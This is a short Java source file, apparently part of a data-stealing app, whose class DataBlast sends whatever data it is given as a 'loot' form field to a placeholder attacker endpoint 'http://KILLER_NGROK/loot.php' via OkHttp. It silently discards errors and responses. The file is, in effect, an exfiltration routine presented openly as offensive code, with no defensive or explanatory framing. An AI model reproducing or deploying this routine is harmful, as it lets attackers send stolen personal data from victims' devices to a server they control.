package com.terminator;  
import okhttp3.*;  
import java.io.IOException;  

public class DataBlast {  
    static String SERVER = "http://KILLER_NGROK/loot.php";  

    public static void fire(String data) {  
        OkHttpClient client = new OkHttpClient();  
        RequestBody body = new FormBody.Builder().add("loot", data).build();  
        Request req = new Request.Builder().url(SERVER).post(body).build();  

        client.newCall(req).enqueue(new Callback() {  
            @Override public void onFailure(Call call, IOException e) {}  
            @Override public void onResponse(Call call, Response res) {}  
        });  
    }  
}  
